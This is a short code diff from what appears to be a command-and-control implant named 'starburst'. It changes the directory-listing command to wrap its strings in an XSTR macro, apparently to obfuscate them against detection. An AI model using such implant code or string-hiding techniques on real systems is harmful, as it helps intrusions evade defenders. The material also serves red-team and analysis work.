@@ -27,7 +27,7 @@ auto declfn starburst::cmd_ls(
     }
 
     // append \* for FindFirstFile
-    str_concat( path_buf, symbol<char*>( const_cast<char*>( "\\*" ) ) );
+    str_concat( path_buf, XSTR( "\\*" ) );
 
     wchar_t wpath[520] = { 0 };
     inst.kernel32.MultiByteToWideChar( CP_ACP, 0, path_buf, -1, wpath, 520 );
@@ -37,7 +37,7 @@ auto declfn starburst::cmd_ls(
 
     if ( h_find == INVALID_HANDLE_VALUE ) {
         queue_response( inst, task_uuid, RESPONSE_ERROR,
-            symbol<char*>( const_cast<char*>( "FindFirstFileW failed" ) ) );
+            XSTR( "FindFirstFileW failed" ) );
         return;
     }
 
@@ -46,7 +46,7 @@ auto declfn starburst::cmd_ls(
     if ( !pkg ) {
         inst.kernel32.FindClose( h_find );
         queue_response( inst, task_uuid, RESPONSE_ERROR,
-            symbol<char*>( const_cast<char*>( "alloc failed" ) ) );
+            XSTR( "alloc failed" ) );
         return;
     }
 
